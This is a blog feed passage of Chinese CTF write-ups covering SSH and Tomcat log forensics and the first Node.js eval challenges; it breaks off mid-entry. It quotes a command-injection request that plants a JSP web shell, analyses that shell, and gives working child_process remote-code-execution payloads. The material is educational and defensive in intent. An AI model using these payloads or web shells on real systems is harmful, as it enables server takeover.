    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SSH连接端口222，账号：root，密码：toor</p><h2 id="SSH日志分析常用思路"><a href="#SSH日志分析常用思路" class="headerlink" title="SSH日志分析常用思路"></a>SSH日志分析常用思路</h2><p>SSH日志分析是应急响应与安全审计的核心。通过审查配置文件和登录日志，可以快速发现未授权访问、定位攻击源并核查安全基线。标准的分析流程如下：</p><p><strong>1. 审查配置：确认“规则”</strong></p><p>分析日志前，先看SSH服务的核心配置文件 <strong><code>/etc/ssh/sshd_config</code></strong>，了解允许哪些行为</p><ul><li><strong>访问控制</strong>：检查 <code>AllowUsers</code>, <code>AllowGroups</code> 等指令，确定谁可以登录</li><li><strong>认证方式</strong>：检查 <code>PasswordAuthentication</code> 是否开启，是否仅允许密钥登录</li><li><strong>高危设置</strong>：检查 <code>PermitRootLogin</code> 是否允许root直接登录</li></ul><p><strong>2. 分析日志：发现“事件”</strong></p><p>根据系统，主要分析以下认证日志（包括 <code>.1</code>, <code>.gz</code> 等归档文件）：</p><ul><li>Debian&#x2F;Ubuntu: <strong><code>/var/log/auth.log</code></strong></li><li>CentOS&#x2F;RHEL: <strong><code>/var/log/secure</code></strong></li></ul><p>重点关注包含以下关键字的日志条目：</p><ul><li><strong>成功登录</strong>：<code>Accepted password</code> 或 <code>Accepted publickey</code> 等</li><li><strong>登录失败</strong>：<code>Failed password</code> 、<code>Failed publickey</code> 或 <code>invalid user</code> 等</li><li><strong>用户切换&#x2F;提权</strong>：<code>session opened for user</code> (常用于追踪<code>sudo</code>等操作)</li></ul><p><strong>3. 聚合统计：提取“情报”</strong></p><p>使用命令行工具（如 <code>grep</code>, <code>awk</code>, <code>sort</code>, <code>uniq</code>）从海量日志中提取有价值的信息，回答关键问题：</p><ul><li><strong>攻击来源</strong>：哪个IP发起了最多的失败尝试？</li><li><strong>爆破目标</strong>：哪个用户名被攻击次数最多？</li><li><strong>成功渗透</strong>：哪些用户和IP成功登录了系统？</li><li><strong>行为画像</strong>：梳理单个IP或用户的完整活动时间线</li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250819150456749.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>可以登录 SSH 的账号数量是多少</strong></p><p>我们先了解什么是<code>sshd_config</code>文件</p><p><code>sshd_config</code> 是 SSH 服务器（sshd）的主配置文件，用于配置 SSH 服务端的各种参数和行为</p><ul><li>设置 SSH 服务器监听的端口号（默认22端口）</li><li>指定允许或禁止的登录方式（密码认证、公钥认证等）</li><li>是否允许 root 账户远程登录</li><li>配置登录超时时间、日志级别、安全策略等</li><li>控制哪些用户或用户组可以通过SSH登录</li></ul><p>查看<code>/etc/ssh/sshd_config</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819132115717.png"></p><p>在最下面那里可以看到只允许<code>SSHD_USER</code>用户组和<code>root</code>用户组进行ssh登录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250819132728634.png"></p><p>然后在<code>/etc/group</code>筛选出这两个组</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;^(root|SSHD_USER):&#x27;</span> /etc/group</span><br></pre></td></tr></table></figure><p>这个命令的意思是：</p><ul><li><code>-E</code> 参数表示启用扩展正则表达式，支持更多高级符号和语法，如“|”表示或、“()”用于分组、“+”表示重复等，使表达式更简洁易读，匹配功能更强大</li><li><code>^(root|SSHD_USER):</code> 表示匹配以“root:”或“SSHD_USER:”开头的行</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/20250819133240938.png"></p><p>root组后面为空，表示这个组<strong>没有附加用户</strong>（也就是没有把别的用户名手动加进组内），默认为root。然后<code>SSHD_USER</code>组有两个用户，分别为toor和root，去重之后可以登录 SSH 的账号就只有toor和root用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次）</strong></p><p><code>auth.log</code> 是Linux系统记录身份认证相关信息的日志文件，包括用户登录成功、失败、ssh连接、公钥认证和使用sudo等操作的记录。它帮助管理员监控登录情况和发现安全问题，是安全审计的重要依据</p><p>其中<code>auth.log</code>表示最新日志，<code>auth.log.1</code>表示上一轮未压缩归档，<code>auth.log.N.gz</code>表示更早的归档（N为数字）</p><p>进入log日志文件夹，查看当前目录文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log &amp;&amp; <span class="built_in">ls</span></span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819134348847.png"></p><p>我们要分析的是<strong>已归档文件</strong>，也就是<code>auth.log.1</code>和<code>auth.log.2.gz</code></p><p>先解压<code>auth.log.2.gz</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -d auth.log.2.gz</span><br></pre></td></tr></table></figure><p>用<code>gzip</code>命令解压后，会删除原本的<code>.gz</code>压缩文件，并生成新的文件</p><p>然后筛选出包含<code>Accepted password</code>或<code>Accepted publickey</code>的日志记录即可</p><ul><li><strong>Accepted password</strong>：表示通过密码验证成功登录</li><li><strong>Accepted publickey</strong>：表示通过公钥认证成功登录</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&quot;Accepted password|Accepted publickey&quot;</span> auth.log.1 auth.log.2 | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819141505256.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;103&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>SSH日志中登录成功次数最多的用户的用户名是什么</strong></p><p>用<code>awk</code>筛选登录成功的日志记录即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&quot;Accepted password|Accepted publickey&quot;</span> auth.log.1 auth.log.2 | awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250819141749276.png"></p><p>可以看到SSH日志中登录成功次数最多的用户名是toor</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;toor&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag{用户名,ip})</strong></p><p>直接筛选出包含<code>Failed password</code>或<code>Failed publickey</code>的记录，然后<code>awk</code>查看用户名和IP地址即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&quot;Failed password|Failed publickey&quot;</span> auth.log.1 auth.log.2 | awk <span class="string">&#x27;&#123;print $9, $(NF-3)&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -n</span><br></pre></td></tr></table></figure><ul><li><code>awk &#39;&#123;print $9, $(NF-3)&#125;&#39;</code> 表示打印第9列（用户名）和倒数第4列（登录来源IP，通常日志中IP在倒数第4列）</li><li><code>sort</code> 对结果进行排序</li><li><code>uniq -c</code> 统计相同用户名和IP的出现次数</li><li><code>sort -n</code> 表示按照 <strong>数字大小</strong> 进行排序，而不是按字母ASCII顺序</li></ul><p><img src="https://oss.waynejoons.icu/picphoto/image-20250819142357642.png"></p><p>可以看到SSH日志中登录失败次数最多的用户是root，登录使用的ip是<code>87.163.111.11</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;root,87.163.111.11&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">日志分析-ssh日志分析详解</summary>
    
    
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>玄机靶场 | 日志分析-Tomcat日志分析</title>
    <link href="https://waynejoon.github.io/posts/Xuanji-CTF-Tomcat-Log-Analysis/"/>
    <id>https://waynejoon.github.io/posts/Xuanji-CTF-Tomcat-Log-Analysis/</id>
    <published>2025-08-16T10:47:39.000Z</published>
    <updated>2025-11-10T04:12:52.330Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>小王在自己的服务器上安装配置了Tomcat，并写了几个简单的网页。但由于安全意识不足，很快就被攻击者利用了。请你帮他排查一下存在的安全问题</p><p>RDP 端口3389 用户名&#x2F;密码：<strong>Administrator&#x2F;4210bf@</strong></p><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p><img src="https://oss.waynejoons.icu/picphoto/20250816182518842.png"></p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤#1"></a>步骤#1</h3><p><strong>Tomcat日志所在的绝对路径是？</strong></p><p>首先连接目标电脑，在C盘中可以看到server目录，根据名字猜测是提供服务的</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172136057.png"></p><p>点进去可以看到tomcat目录</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172221599.png"></p><p>打开目录文件，在里面找到logs目录，然后复制路径即可</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172410540.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;C:\server\apache-tomcat-11.0.5\logs&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤#2"></a>步骤#2</h3><p><strong>攻击者对某网站进行了口令爆破。请你判断口令成功匹配的请求的响应码是？</strong></p><p>我们打开logs目录，可以看到里面有个日志占用空间较大</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816172651199.png"></p><p>打开文件进行分析，前面是攻击者在进行目录扫描，然后后面有个关键的地方</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173141689.png"></p><p>这里攻击者访问了<code>/demo/admin.jsp</code>，但是由于没有凭证随后重定向到登录界面，也就是<code>login.jsp</code>，接着就开始对网站进行口令爆破</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173415379.png"></p><p>可以看到，在经历了大量了爆破之后也是成功登入了系统，状态码显示302，然后跳转到<code>/demo/admin.jsp</code></p><p>因此判断口令成功匹配的响应码就是302</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;302&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤#3"></a>步骤#3</h3><p><strong>请你判断其服务器上用于盗取cookie而监听的端口是？</strong></p><p>题目描述：攻击者向admin.jsp的管理员留言板界面发送了恶意JS代码从而构成了存储型XSS。已知攻击者试图盗取管理员cookie，并将其发送至其本地服务器上。</p><p>题目提示攻击者向<code>admin.jsp</code>发送恶意代码，结合前面的日志，我们可知该文件位于<code>/demo</code>目录里面</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173826280.png"></p><p>里面有个<code>messages.txt</code>，打开后可以看到里面存储了管理员留言板接收到的信息</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816173943320.png"></p><p>这个js语句就是攻击者用来窃取管理员cookie的，因此用来监听的端口就是5000</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5000&#125;</span><br></pre></td></tr></table></figure><p>接下来我们分析一下<code>admin.jsp</code>中的漏洞代码，里面有个代码片段用于显示留言</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;所有留言&lt;/h2&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;% <span class="keyword">if</span> (messages != <span class="literal">null</span> &amp;&amp; !messages.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String message : messages) &#123;</span><br><span class="line">    %&gt;</span><br><span class="line">        &lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;</span><br><span class="line">    &lt;%</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; %&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure><p>其中关键就是<code>&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;</code>，它使用了 JSP 的表达式 <code>&lt;%= ... %&gt;</code> 直接将从文件中读取的 <code>message</code> 字符串<strong>未经任何处理</strong>就输出到 HTML 页面上</p><p>攻击者提交的留言内容会原封不动地保存到<code>messages.txt</code> 文件里，浏览器在解析 HTML 时，会把 <code>&lt;script&gt;</code> 标签当作可执行代码来运行，从而触发XSS漏洞</p><p>修复建议就是对输出的 <code>message</code> 变量进行<strong>HTML 实体编码</strong></p><p><strong>修复前：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;&lt;%= message %&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p><strong>修复后：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.commons.lang3.StringEscapeUtils&quot;</span> %&gt;</span><br><span class="line"><span class="comment">// ...    </span></span><br><span class="line">&lt;li&gt;&lt;%= StringEscapeUtils.escapeHtml4(message) %&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure><p>或者<strong>使用JSTL标签库</strong></p><p>首先在JSP页面顶部引入JSTL核心标签库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ taglib uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> prefix=<span class="string">&quot;c&quot;</span> %&gt;</span><br></pre></td></tr></table></figure><p>然后使用 <code>&lt;c:out&gt;</code> 标签来输出内容，它默认就会进行HTML编码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;message&quot;</span> items=<span class="string">&quot;$&#123;messages&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;li&gt;&lt;c:out value=<span class="string">&quot;$&#123;message&#125;&quot;</span> /&gt;&lt;/li&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br></pre></td></tr></table></figure><h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤#4"></a>步骤#4</h3><p><strong>攻击者利用执行系统命令的参数是？</strong></p><p>回到刚才的log日志，在最下面可以看到有个文件传递了系统命令内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174224670.png"></p><p>该文件原本可能是用于接收IP地址并执行网络命令的（如 <code>ping</code> 或 <code>traceroute</code>），攻击者没有输入一个正常的IP地址，而是通过命令连接符 <code>&amp;&amp;</code> 执行系统命令，因此参数就是<code>ip</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ip&#125;</span><br></pre></td></tr></table></figure><h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤#5"></a>步骤#5</h3><p><strong>攻击者通过某种手段遗留了后门文件，请你找到该文件并按需提交其文件中的flag</strong></p><p>同样也是刚才的日志文件，看最下面那行的参数内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=8.8.8.8+%26%26+echo+%5E%3C%25%40+page+language%3D%22java%22+import%3D%22java.util.*%2Cjava.io.*%22+%25%5E%3E%5E%3C%25+String+cmd+%3D+request.getParameter%28%22cmd%22%29%3B+if+%28cmd+%21%3D+null%29+%7B+Process+p+%3D+Runtime.getRuntime%28%29.exec%28cmd%29%3B+BufferedReader+reader+%3D+new+BufferedReader%28new+InputStreamReader%28p.getInputStream%28%29%29%29%3B+String+line%3B+while+%28%28line+%3D+reader.readLine%28%29%29+%21%3D+null%29+%7B+out.println%28line+%2B+%22%5E%3Cbr%5E%3E%22%29%3B+%7D+%7D+%25%5E%3E+%3E+C%3A%5Cserver%5Capache-tomcat-11.0.5%5Cwebapps%5CROOT%5Chello.jsp HTTP/1.1&quot; 200 1349</span><br></pre></td></tr></table></figure><p><strong>URL解码</strong>，查看原始内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174427405.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=8.8.8.8 &amp;&amp; echo ^&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; %^&gt;^&lt;% String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; Process p = Runtime.getRuntime().exec(cmd); BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while ((line = reader.readLine()) != null) &#123; out.println(line + &quot;^&lt;br^&gt;&quot;); &#125; &#125; %^&gt; &gt; C:\server\apache-tomcat-11.0.5\webapps\ROOT\hello.jsp HTTP/1.1&quot; 200 1349</span><br></pre></td></tr></table></figure><p>可以看到攻击者把代码写进了<code>C:\server\apache-tomcat-11.0.5\webapps\ROOT\hello.jsp</code></p><p>我们简单分析这个后门代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 从URL请求中获取名为 &quot;cmd&quot; 的参数</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="comment">// 如果 &quot;cmd&quot; 参数存在</span></span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 在服务器上执行该参数的值作为一个系统命令</span></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="comment">// 读取该命令执行后的输出结果</span></span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(p.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="comment">// 将输出结果逐行打印到网页上</span></span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            out.println(line + <span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>文件上传后，攻击者只需要访问<code>/hello.jsp?cmd=</code>即可执行系统命令</p><p>我们找到这个文件，查看里面的内容</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174619541.png"></p><p>可以看到里面有个注释写了flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/* 疑似flag? eW91bWFkZWl0 */</span><br></pre></td></tr></table></figure><p>但是如果直接提交的话是不行的，需要进行<strong>base64解码</strong>后再提交</p><p><img src="https://oss.waynejoons.icu/picphoto/20250816174729153.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;youmadeit&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">日志分析-Tomcat日志分析详解</summary>
    
    
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="应急响应" scheme="https://waynejoon.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    <category term="玄机靶场" scheme="https://waynejoon.github.io/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW | nodejs题解 web334 - web344</title>
    <link href="https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/"/>
    <id>https://waynejoon.github.io/posts/ctfshow-nodejs-web334-web344/</id>
    <published>2025-08-14T02:45:39.000Z</published>
    <updated>2025-11-10T04:10:48.936Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是nodejs"><a href="#什么是nodejs" class="headerlink" title="什么是nodejs"></a>什么是nodejs</h2><p><strong>Node.js</strong> 是一个基于 Chrome V8 引擎的开源、跨平台的 <strong>JavaScript 运行环境</strong>，主要用于在服务端运行JavaScript代码。以前JavaScript大多只能在浏览器中运行，有了 Node.js，开发者可以用 JavaScript 开发后端服务端应用，比如Web服务器、命令行工具等</p><p>核心特点如下：</p><ul><li>采用 <strong>事件驱动</strong>、<strong>非阻塞式I&#x2F;O</strong>模型，使其高效、轻量，特别适合处理高并发、I&#x2F;O密集的网络应用</li><li>利用 <strong>V8 引擎</strong>，JavaScript 代码执行速度快、性能高</li><li>拥有全球最大的开源包管理生态系统—— <strong>npm</strong>，可便捷地安装和管理各种第三方模块和工具包</li><li>让前端开发者可以用同一种语言开发前后端，提高开发效率与协同</li></ul><p>Node.js 不是一门新语言，也不是JavaScript的框架，更不是Web服务器；它就是一个能在服务器端运行JavaScript的平台，类似于Java的JVM在服务器上运行Java程序</p><h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><p>下载题目附件进行分析，一共就两个文件</p><p><img src="https://oss.waynejoons.icu/picphoto/20250814101654895.png"></p><p><code>user.js</code>里面写了用户账号密码</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811165358821.png"></p><p>然后<code>login.js</code>是关于登录的一些逻辑校验，其中我们需要重点关注的是<code>findUser</code>变量这里</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811165648974.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br></pre></td></tr></table></figure><p>要求名字不为CTFSHOW，但是后面有个<code>toUpperCase()</code>函数，也就是输入的用户名会变大写，那只要输入小写的<code>ctfshow</code>，经过<code>toUpperCase()</code>变大写之后就通过验证了</p><p>打开题目环境，登录框输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账号：ctfshow</span><br><span class="line">密码：123456</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811170126699.png"></p><h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><p>打开题目环境，查看网页源代码，可以看到有注释提示，可以拼接进网站访问</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811221417656.png"></p><p>应该是<code>eval()</code>函数，可以用<code>child_process</code>来调用API执行系统命令</p><p><strong>什么是child_process</strong></p><p><strong>child_process</strong> 是 Node.js 的一个核心模块，用于在应用程序中创建和管理<strong>子进程</strong>，让 JavaScript 能够在服务器端执行外部命令、脚本或者进行多进程并发运算</p><p><strong>常用API</strong></p><ul><li><code>spawn()</code>：创建新进程，流方式处理数据，适合实时数据处理</li><li><code>exec()</code>：执行命令或脚本，回调方式返回所有输出，适合一次性任务</li><li><code>execFile()</code>：直接执行文件，减少命令注入风险</li><li><code>fork()</code>：专门用于启动新的 Node.js 进程，并与主进程实现 IPC（进程间通信）</li><li><code>execSync()</code>：同步执行命令，阻塞直到完成，返回结果，简洁直观</li><li><code>spawnSync()</code>：同步版本的 spawn，阻塞等待子进程完成，返回详细进程信息</li></ul><p>这题需要我们用<code>require</code>包含<code>child_process</code>模块来调用API执行命令</p><p>但是如果我们直接执行<code>exec()</code>，会返回<code>[object Object]</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).exec(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811224336094.png"></p><p>这是因为<code>exec()</code>是异步执行，通过回调函数传递输出与错误，直接调用的话会返回一个 <code>ChildProcess</code> 对象，正确的方法应像下面这样</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="title function_">exec</span>(<span class="string">&#x27;ls&#x27;</span>, <span class="function">(<span class="params">err, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(stdout); <span class="comment">// 这里才是命令输出</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>而<code>execSync()</code>则是同步执行，直接返回命令执行后的输出内容（Buffer 或 String），可以直接打印数据</p><p>所以我们用<code>execSync()</code>来执行命令</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811223714875.png"></p><p>成功得到flag</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811223800345.png"></p><p>当然调用<code>spawnSync()</code>也可以，不过直接打印的话它会返回一个<strong>包含多个属性的对象</strong>，需要用stdout输出Buffer，然后通过<code>toString()</code>转换为字符串，调用格式为<code>spawnSync(command, args)</code>。如果你把命令和参数写在同一个字符串里（如 <code>&#39;cat fl00g.txt&#39;</code>），<code>spawnSync</code> 会当作单一命令去执行，导致找不到该命令或执行出错，因此需要拆开</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl00g.txt&#x27;]).stdout.toString()</span><br></pre></td></tr></table></figure><p><img src="https://oss.waynejoons.icu/picphoto/20250811225627185.png"></p><h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><p>这题跟上题差不多，但是调用<code>execSync()</code>不行了</p><p><img src="https://oss.waynejoons.icu/picphoto/20250811231135598.png"></p><p>这里介绍两个变量，<code>__filename</code>和<code>__dirname</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__filename：获取当前模块文件的完整绝对路径文件名</span><br><span class="line">__dirname：获取当前文件所在目录的完整目录名</span><br></pre></td></tr></table></figure><p>直接在网站拼接命令执行</p><figure class="highlight 